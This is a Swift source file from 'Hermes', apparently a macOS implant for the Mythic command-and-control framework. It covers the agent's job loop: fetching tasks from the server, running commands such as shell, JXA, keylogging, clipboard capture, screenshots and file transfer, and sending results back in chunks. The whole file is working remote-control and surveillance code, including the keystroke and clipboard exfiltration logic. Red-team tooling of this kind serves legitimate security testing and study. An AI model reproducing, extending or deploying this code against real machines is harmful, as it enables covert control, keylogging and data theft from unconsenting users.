//
//  jobs.swift
//  Hermes
//
//  Created by slyd0g on 6/1/21.
//

import Foundation
import Cocoa

class Job {
    var jobID: Int
    var taskID: String
    var command: String
    var parameters: String
    var result: String
    var status: String // error
    var completed: Bool
    var started: Bool
    var success: Bool
    var thread: Thread?
    var processes = [JSON]()
    var fileBrowser: JSON
    var removedFiles = [JSON]()
    // download
    var downloadChunkNumber: Int
    var downloadTotalChunks: Int
    var downloadFullPath: String
    var downloadHost: String
    var downloadIsScreenshot: Bool
    var downloadFileID: String
    var downloadChunkData: String
    var downloadFileSize: Int
    // upload
    var uploadChunkNumber: Int
    var uploadTotalChunks: Int
    var uploadFileID: String
    var uploadFullPath: String
    var uploadData: String
    // screenshot
    var screenshotTotalDisplays: Int
    var screenshotDisplayNumber: Int
    // keylog
    var keylogBuffer: String

    init() {
        self.jobID = 0
        self.taskID = ""
        self.command = ""
        self.parameters = ""
        self.result = ""
        self.status = ""
        self.completed = false
        self.started = false
        self.success = false
        self.fileBrowser = [:]
        self.downloadChunkNumber = 0
        self.downloadTotalChunks = 0
        self.downloadFullPath = ""
        self.downloadHost = ""
        self.downloadIsScreenshot = false
        self.downloadFileID = ""
        self.downloadChunkData = ""
        self.downloadFileSize = 0
        self.uploadChunkNumber = 0
        self.uploadTotalChunks = 0
        self.uploadFileID = ""
        self.uploadFullPath = ""
        self.uploadData = ""
        self.screenshotTotalDisplays = 0
        self.screenshotDisplayNumber = 0
        self.keylogBuffer = ""
    }
}

var capslock = false
var keylogBuffer = ""
var activeApp = ""

class JobList {
    var jobCount = 0
    var jobs = [Job]()
}

func getTasking(jobList: JobList) throws {
    // Create JSON payload
    let jsonPayload = JSON([
        "action": "get_tasking",
        "tasking_size": -1,
    ])
    
    // Decode negotiated b64 session key from agent config
    let sessionKey = fromBase64(data: agentConfig.encodedAESKey)
    
    // Send Hermes message, get Mythic response, decrypt and decode
    let jsonResponse = sendHermesMessage(jsonMessage: jsonPayload, payloadUUID: toData(string: agentConfig.payloadUUID), decodedAESKey: sessionKey, httpMethod: "get")
    print("GET_TASKING", jsonResponse)
    let jsonTasks = jsonResponse["tasks"]
    
    // Loop through tasks
    for(_, tasks):(String, JSON) in jsonTasks {
        let job = Job.init()
        job.jobID = jobList.jobCount
        job.command = tasks["command"].stringValue
        job.parameters = tasks["parameters"].stringValue
        job.taskID = tasks["id"].stringValue
        
        // Handle upload task
        if job.command == "upload" {
            if let dataFromString = tasks["parameters"].stringValue.data(using: .utf8, allowLossyConversion: false) {
                let json = try JSON(data: dataFromString)
                var path = json["remote_path"].stringValue
                
                // Strip out quotes if they exist, concept from Apfell agent
                if (path.prefix(1) == "\"") {
                    path.removeFirst()
                    path.removeLast()
                }
                
                // Check if ~ to base search from user home directory
                if (path.prefix(1) == "~") {
                    path = NSString(string: path).expandingTildeInPath
                }
                
                job.uploadFileID = json["file"].stringValue
                job.uploadFullPath = path
            }
        }
        
        // Add jobs to the job list and increase jobCount by 1
        jobList.jobs.append(job)
        jobList.jobCount += 1
    }
}

func executeJob(jobList: JobList) {
    // Setup DispatchQueue to run async threads
    let queue = DispatchQueue(label: "", qos: .utility, attributes: .concurrent)
    
    // Loops through all jobs
    for job in jobList.jobs {
        // Start any untasked jobs
        if !job.completed {
            job.started = true
            queue.async {
                job.thread = Thread.current
                executeTask(job: job, jobList: jobList)
            }
        }
    }
}

func executeTask(job: Job, jobList: JobList) {
    switch job.command {
    case "pwd":
        pwd(job: job)
    case "cd":
        cd(job: job)
    case "exit":
        exit(job: job)
    case "cat":
        cat(job: job)
    case "run":
        runBinary(job: job)
    case "shell":
        shell(job: job)
    case "list_apps":
        listApplications(job: job)
    case "ps":
        ps(job: job)
    case "sleep":
        sleep(job: job)
    case "jobs":
        listJobs(job: job, jobList: jobList)
    case "jobkill":
        jobKill(job: job, jobList: jobList)
    case "ls":
        ls(job: job)
    case "rm":
        rm(job: job)
    case "download":
        // Download job has no file_id from Mythic yet, we need to get one, if we have a file_id, get a chunk
        if job.downloadFileID == "" {
            getFileID(job: job, isScreenshot: false)
        }
        // If job already has a file_id, download a chunk of the file
        else {
            downloadChunk(job: job)
        }
    case "upload":
        // Only perform the write function after the first upload response
        if job.uploadTotalChunks >= 1 {
            upload(job: job)
        }
    case "clipboard":
        if job.status == "" {
            clipboard(job: job)
        }
    case "screenshot":
        // Gather total number of displays to download
        if job.screenshotTotalDisplays == 0 {
            getTotalDisplays(job: job)
            print("TOTAL_DISPLAYS", job.screenshotTotalDisplays)
        }
        // Start cycling through displays
        else if job.screenshotDisplayNumber < job.screenshotTotalDisplays {
            // Download job has no file_id from Mythic yet, we need to get one, if we have a file_id, get a chunk
            if job.downloadFileID == "" {
                getFileID(job: job, isScreenshot: true)
            }
            // If job already has a file_id, download a chunk of the file
            else {
                downloadScreenshotChunk(job: job)
            }
        }
        // Successfully looped through all displays
        else {
            job.result = ""
            job.completed = true
            job.success = true
        }
    case "mkdir":
        makeDirectory(job: job)
    case "keylog":
        if job.status != "keylog_started" {
            let swiftSpy = SwiftSpy()
            swiftSpy.keylog(job: job)
        }
    case "whoami":
        whoami(job: job)
    case "fda_check":
        fullDiskAccessCheck(job: job)
    case "env":
        getEnvironmentVariables(job: job)
    case "setenv":
        setEnvironmentVariable(job: job)
    case "unsetenv":
        unsetEnvironmentVariable(job: job)
    case "list_tcc":
        listTCCDatabase(job: job)
    case "mv":
        mv(job: job)
    case "cp":
        cp(job: job)
    case "hostname":
        hostname(job: job)
    case "ifconfig":
        ifconfig(job: job)
    case "jxa":
        jxa(job: job)
    default:
        job.result = "Command not implemented."
        job.status = "error"
        job.completed = true
        job.success = false
    }
}

func postResponse(jobList: JobList) {
    var jsonJobOutput = [JSON]()
    
    // Loop through all jobs and filter for completed
    for job in jobList.jobs {
        // Normal completed jobs
        if job.completed {
            let jsonResponse = JSON([
                "task_id": job.taskID,
                "user_output": job.result,
                "completed": job.success,
                "status": job.status,
                "processes": job.processes,
                "file_browser:": job.fileBrowser,
                "removed_files": job.removedFiles,
            ])
            jsonJobOutput.append(jsonResponse)
        }
        
        // Handle upload jobs
        if job.command == "upload" {
            // Increase chunk number, starts at 0
            job.uploadChunkNumber += 1
            // Get first chunk or remaining chunks
            if ((job.uploadChunkNumber == 1) || (job.uploadChunkNumber <= job.uploadTotalChunks)) {
                let jsonUpload = JSON([
                    "chunk_size": 512000,
                    "file_id": job.uploadFileID,
                    "chunk_num": job.uploadChunkNumber,
                    "full_path": job.uploadFullPath,
                ])
                
                let jsonResponse = JSON([
                    "upload": jsonUpload,
                    "user_output": job.result,
                    "completed": job.success,
                    "status": job.status,
                    "task_id": job.taskID,
                ])
                jsonJobOutput.append(jsonResponse)
            }
        }
        
        // Handle download jobs
        if job.command == "download" {
            // We don't have a file_id yet, request one from Mythic
            if ((job.downloadFileID == "") && (job.downloadTotalChunks > 0)) {
                let jsonResponse = JSON([
                    "total_chunks": job.downloadTotalChunks,
                    "task_id": job.taskID,
                    "full_path": job.downloadFullPath,
                    "host": job.downloadHost,
                    "is_screenshot": job.downloadIsScreenshot,
                ])
                jsonJobOutput.append(jsonResponse)
            }
            // Send file chunk
            else if((job.downloadFileID != "") && (job.downloadTotalChunks > 0)) && (job.downloadChunkData != "") {
                let jsonResponse = JSON([
                    "chunk_num": job.downloadChunkNumber,
                    "file_id": job.downloadFileID,
                    "chunk_data": job.downloadChunkData,
                    "task_id": job.taskID,
                ])
                jsonJobOutput.append(jsonResponse)
                job.downloadChunkNumber = job.downloadChunkNumber + 1
            }
        }
        
        // Handle screenshot jobs
        if job.command == "screenshot" {
            // We don't have a file_id yet, request one from Mythic
            if ((job.downloadFileID == "") && (job.downloadTotalChunks > 0)) {
                let jsonResponse = JSON([
                    "total_chunks": job.downloadTotalChunks,
                    "task_id": job.taskID,
                    "full_path": job.downloadFullPath,
                    "host": job.downloadHost,
                    "is_screenshot": job.downloadIsScreenshot,
                ])
                jsonJobOutput.append(jsonResponse)
            }
            // Send file chunk
            else if((job.downloadFileID != "") && (job.downloadTotalChunks > 0)) && (job.downloadChunkData != "") {
                let jsonResponse = JSON([
                    "chunk_num": job.downloadChunkNumber,
                    "file_id": job.downloadFileID,
                    "chunk_data": job.downloadChunkData,
                    "task_id": job.taskID,
                ])
                jsonJobOutput.append(jsonResponse)
                job.downloadChunkNumber = job.downloadChunkNumber + 1
            }
        }
        
        // Handle keylog jobs
        if job.command == "keylog" {
            job.keylogBuffer += keylogBuffer
            keylogBuffer = ""
            let jsonResponse = JSON([
                "task_id": job.taskID,
                "user": NSUserName(),
                "window_title": NSWorkspace.shared.frontmostApplication?.localizedName,
                "keystrokes": job.keylogBuffer,
            ])
            job.keylogBuffer = ""
            jsonJobOutput.append(jsonResponse)
        }
        
        // Continuously stream clipboard data
        if job.command == "clipboard" {
            let jsonResponse = JSON([
                "task_id": job.taskID,
                "user_output": job.result,
            ])
            job.result = ""
            jsonJobOutput.append(jsonResponse)
        }
    }
    
    let jsonPayload = JSON([
        "action": "post_response",
        "responses": jsonJobOutput,
    ])
    print("HERMES_POST_RESPONSE", jsonPayload)
    // Decode negotiated b64 session key from agent config
    let sessionKey = fromBase64(data: agentConfig.encodedAESKey)
    
    // Send Hermes message, get Mythic response, decrypt and decode
    let jsonResponse = sendHermesMessage(jsonMessage: jsonPayload, payloadUUID: toData(string: agentConfig.payloadUUID), decodedAESKey: sessionKey, httpMethod: "post")
    print("MYTHIC_POST_RESPONSE", jsonResponse)
    let jsonResponses = jsonResponse["responses"]
    
    // Process Mythic response
    for(_, responses):(String, JSON) in jsonResponses {
        // Find success message from Mythic
        if responses["status"].stringValue == "success" {
            // Loop through Hermes jobs
            for (index, job) in jobList.jobs.enumerated() {
                // Found a job that succeeded and matched with task_id
                if responses["task_id"].stringValue == job.taskID {
                    // Delete job if it is a "normal" job
                    if ((job.command != "download") && (job.command != "upload") && (job.command != "screenshot") && (job.command != "keylog") && (job.command != "clipboard") && (job.command != "exit")) {
                        jobList.jobs.remove(at: index)
                        print("job removed")
                    }
                    // Handle exit responses
                    else if job.command == "exit" {
                        exit(0)
                    }
                    // Handle screenshot responses
                    else if job.command == "screenshot" {
                        // Save file_id returned from Mythic for first download message
                        if ((job.downloadFileID == "") && (responses["file_id"].exists())) {
                            job.downloadFileID = responses["file_id"].stringValue
                            print("SAVING_FILEID", job.downloadFileID)
                        }
                        // Delete job if download task is complete
                        else if job.screenshotDisplayNumber >= job.screenshotTotalDisplays {
                            jobList.jobs.remove(at: index)
                            print("screenshot job removed")
                        }
                        // Once download is complete, reset job variables for multiple displays
                        else if (job.downloadChunkNumber > job.downloadTotalChunks) && (job.screenshotDisplayNumber < job.screenshotTotalDisplays) {
                            print("upload done, moving onto next display")
                            job.screenshotDisplayNumber += 1
                            job.downloadFileID = ""
                            job.downloadChunkNumber = 0
                            job.downloadTotalChunks = 0
                            job.downloadFileSize = 0
                            job.downloadChunkData = ""
                        }
                        // Error may have occurred when getting file_id from Mythic, remove the job
                        else if job.downloadTotalChunks == 0 {
                            print("error, removing screenshot job")
                            jobList.jobs.remove(at: index)
                        }
                    }
                    // Handle download responses
                    else if job.command == "download" {
                        // Save file_id returned from Mythic for first download message
                        if ((job.downloadFileID == "") && (responses["file_id"].exists())) {
                            job.downloadFileID = responses["file_id"].stringValue
                            print("SAVING_FILEID", job.downloadFileID)
                        }
                        // Delete job if download task is complete
                        else if job.downloadChunkNumber > job.downloadTotalChunks {
                            jobList.jobs.remove(at: index)
                            print("download job removed")
                        }
                        // Error may have occurred when getting file_id from Mythic, remove the job
                        else if job.downloadTotalChunks == 0 {
                            jobList.jobs.remove(at: index)
                        }
                    }
                    // Handle upload responses
                    else if job.command == "upload" {
                        // Save total chunks + chunk_data from first upload message
                        if ((job.uploadTotalChunks == 0) && (responses["total_chunks"].exists())) {
                            job.uploadTotalChunks = responses["total_chunks"].intValue
                            job.uploadData = responses["chunk_data"].stringValue
                        }
                        // parse remaining upload messages
                        else if job.uploadChunkNumber <= job.uploadTotalChunks {
                            job.uploadData = responses["chunk_data"].stringValue
                        }
                        // Delete job if upload task is complete
                        else if job.uploadChunkNumber > job.uploadTotalChunks {
                            //job.uploadData += responses["chunk_data"].stringValue
                            jobList.jobs.remove(at: index)
                        }
                    }
                }
            }
        }
    }
}
